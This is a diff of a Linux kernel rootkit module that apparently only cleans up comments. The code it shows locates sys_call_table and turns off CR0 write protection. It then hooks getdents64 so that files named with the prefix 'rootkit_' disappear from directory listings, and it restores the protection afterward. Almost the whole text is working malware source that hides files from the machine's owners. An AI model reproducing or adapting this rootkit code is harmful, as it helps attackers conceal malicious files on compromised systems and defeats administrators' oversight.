@@ -30,13 +30,11 @@ static unsigned long lookup_name(const char *name)
     return sys_call_table;
 }
 
-/* Тип оригинального обработчика */
 typedef asmlinkage long (*orig_getdents64_t)(
     const struct pt_regs *regs);
 
 static orig_getdents64_t orig_getdents64;
 
-/* Префикс для скрываемых файлов */
 #define HIDE_PREFIX "rootkit_"
 
 asmlinkage long hooked_getdents64(const struct pt_regs *regs)
@@ -47,16 +45,12 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs)
     long ret;
     unsigned long offset = 0;
 
-    /* Вызываем оригинальный обработчик */
     ret = orig_getdents64(regs);
     if (ret <= 0)
         return ret;
 
-    /* regs->si == rsi на x86_64; в ядрах 6.1+ поле может называться иначе -
-       проверьте arch/x86/include/asm/ptrace.h для вашей версии */
     dirent = (struct linux_dirent64 __user *)regs->si;
 
-    /* Копируем результат в kernel space для модификации */
     kdirent = kzalloc(ret, GFP_KERNEL);
     if (!kdirent)
         return ret;
@@ -66,13 +60,12 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs)
         return ret;
     }
 
-    /* Итерируем по записям, удаляя скрываемые */
     current_dir = kdirent;
     while (offset < ret) {
         pr_info("%s\n", current_dir->d_name);
         if (strncmp(current_dir->d_name, HIDE_PREFIX,
                      strlen(HIDE_PREFIX)) == 0) {
-            /* Сдвигаем оставшиеся записи поверх текущей */
+
             long reclen = current_dir->d_reclen;
             memmove(current_dir,
                     (char *)current_dir + reclen,
@@ -87,24 +80,11 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs)
 
     if (copy_to_user(dirent, kdirent, ret)) {
         kfree(kdirent);
-        return ret; /* fallback: оригинальный результат уже в userspace от первого вызова */
+        return ret;
     }
     kfree(kdirent);
     return ret;
 }
-
-// #define X86_CR0_WP_MASK (1UL << 16)
-
-// static void print_cr0_wp(const char *where)
-// {
-//     unsigned long cr0 = read_cr0();
-
-//     pr_info("%s: CR0 = 0x%lx, WP = %lu\n",
-//             where,
-//             cr0,
-//             !!(cr0 & X86_CR0_WP_MASK));
-// }
-
 
 // static inline void cr0_write_unlock(void)
 // {
@@ -134,21 +114,16 @@ static int __init rootkit_init(void)
     pr_info("sys_call_table address: %px\n", sys_call_table);
     pr_info("__NR_getdents64 = %d\n", __NR_getdents64);
 
-    // Сохраняем оригинал
     orig_getdents64 = (orig_getdents64_t)sys_call_table[__NR_getdents64];
     pr_info("Original getdents64: %px\n", orig_getdents64);
     pr_info("Hook function address: %px\n", hooked_getdents64);
 
-    // Отключаем защиту от записи
     write_cr0_forced(read_cr0() & ~0x10000);
 
-    // Записываем хук
     sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
 
-    // Включаем защиту обратно
     write_cr0_forced(read_cr0() | 0x10000);
 
-    // ЧИТАЕМ ОБРАТНО и проверяем
     unsigned long new_entry = sys_call_table[__NR_getdents64];
     pr_info("After write, table[%d] = %px\n", __NR_getdents64, (void *)new_entry);
 
